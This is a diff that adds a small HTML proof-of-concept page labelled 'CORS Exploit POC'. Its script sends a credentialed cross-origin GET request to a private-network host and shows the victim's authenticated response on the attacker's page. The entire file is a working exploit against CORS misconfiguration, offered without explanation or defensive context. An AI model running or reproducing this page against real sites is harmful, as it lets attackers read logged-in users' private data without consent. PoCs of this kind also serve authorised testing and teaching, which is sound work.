@@ -1,0 +1,31 @@
+
+  <!DOCTYPE html>
+  <html>
+    <body>
+      <center>
+        <h2>CORS Exploit POC</h2>
+        <h3>Get Information</h3>
+         
+        <div id="info">
+          <button type="button" onclick="cors()">Exploit</button>
+        </div>
+        <br/>
+        <textarea id="response" cols="160" rows="60"></textarea>
+      </center>
+
+      <script>
+        function cors() {
+          var xhttp = new XMLHttpRequest();
+          xhttp.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+              document.getElementById("response").innerHTML = this.responseText;
+            }
+          };
+          xhttp.open("GET","http://192.168.33.190", true);
+          xhttp.withCredentials = true;
+          xhttp.send();
+        }
+      </script>
+    </body>
+  </html>
+  
